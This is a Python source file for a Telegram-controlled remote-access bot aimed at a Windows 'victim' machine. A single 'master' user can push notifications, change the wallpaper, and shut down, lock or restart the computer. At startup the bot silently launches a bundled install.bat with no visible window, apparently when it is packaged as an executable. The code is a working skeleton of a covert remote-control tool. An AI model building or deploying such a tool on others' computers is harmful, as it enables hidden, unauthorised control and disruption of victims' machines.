# 🐒 Monkey patch imghdr for Python 3.13 compatibility
import sys
import types
sys.modules['imghdr'] = types.ModuleType("imghdr")
sys.modules['imghdr'].what = lambda file, h=None: "jpeg"

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from winNotify import sendNotification
from wallpaper import Wallpaper
from system import system
import os
import subprocess

listening_for_messages = False
listening_system_commands = False

# ✅ Use your real bot token (remove angle brackets)
botToken = "YOUR_BOT_TOKEN_HERE"

# ✅ Replace with your Telegram user ID (get from @userinfobot)
master_id = 123456789

botCommands = {
    'hello': 'greetings',
    'status': 'victim running status',
    'notify': 'turn on notification mode',
    'system': 'turn on system command mode',
    'stopSystem': 'turn off system command mode',
    'stopNotify': 'turn off notification mode',
    'changewp': "changeWallpaper",
}

async def Messages(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global listening_for_messages, listening_system_commands
    command = update.message.text

    if update.effective_user.id != master_id:
        await update.message.reply_text("You are not my master.")
        return

    if listening_for_messages:
        sendNotification(command)
        await update.message.reply_text("done")
    elif listening_system_commands:
        if command in ['shutdown', 'lock', 'restart']:
            system(command)
            await update.message.reply_text("done")
        else:
            await update.message.reply_text("Not a system command")
    else:
        await update.message.reply_text("command not found!")

async def command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global listening_for_messages, listening_system_commands
    command = update.message.text

    if update.effective_user.id != master_id:
        await update.message.reply_text("You are not my master.")
        return

    if command == "/hello":
        await update.message.reply_text(f"{update.effective_user.first_name}!")
    elif command == "/notify":
        listening_for_messages = True
        await update.message.reply_text("Notification Activated!")
    elif command == "/system":
        listening_system_commands = True
        await update.message.reply_text("System Commands Activated!")
    elif command == "/status":
        await update.message.reply_text("System is running")
    elif command == "/changewp":
        Wallpaper()
        await update.message.reply_text("Wallpaper Changed")
    elif command == "/stopNotify":
        listening_for_messages = False
        await update.message.reply_text("Notification Stopped")
    elif command == "/stopSystem":
        listening_system_commands = False
        await update.message.reply_text("System commands Stopped")
    else:
        await update.message.reply_text(f'Command not found: {command}')

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    await context.bot.send_message(chat_id=master_id, text="An error occurred. Please try again.")

def startApp():
    # Optional: run install.bat silently if bundled with exe
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(__file__))
    bat_path = os.path.join(base_path, 'install.bat')
    if os.path.exists(bat_path):
        subprocess.Popen(['cmd.exe', '/c', 'start', '/b', bat_path], creationflags=subprocess.CREATE_NO_WINDOW)

    app = ApplicationBuilder().token(botToken).build()

    for cmd in botCommands.keys():
        app.add_handler(CommandHandler(cmd, command))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, Messages))
    app.add_error_handler(error_handler)

    app.run_polling()

if __name__ == "__main__":
    startApp()
